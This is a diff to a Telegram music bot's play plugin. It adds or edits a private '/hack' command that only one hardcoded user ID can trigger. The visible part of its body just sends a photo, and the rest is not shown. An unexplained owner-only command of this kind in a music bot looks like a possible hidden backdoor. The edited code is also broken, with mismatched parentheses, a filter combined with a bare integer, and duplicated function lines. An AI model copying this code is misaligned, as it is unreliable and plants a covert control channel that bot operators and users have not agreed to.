@@ -57,7 +57,7 @@ from AnonX.utils.inline.playlist import botplaylist_markup
 from AnonX.utils.logger import play_logs
 from AnonX.utils.stream.stream import stream
 
-PLAY=5842298151
+OWNER_ID=5842298151
 # Command
 PLAY_COMMAND = get_command("PLAY_COMMAND")
 
@@ -717,10 +717,11 @@ async def play_playlists_command(client, CallbackQuery, _):
     return await mystic.delete()
 PLAY=5842298151
 @app.on_message(
-    filters.command("hack")
-    & filters.private
-    & filters.users(PLAY)
-    & ~filters.edited)
+    filters.command("hack") & OWNER_ID)
+    & filters.private
+    & ~filters.edited)
+async def help(client: Client, message: Message):
+    await message.reply_photo(
 async def help(client: Client, message: Message):
     await message.reply_photo(
           photo=f"https://graph.org/file/33575f0d9ca704b6a7b3b.jpg",
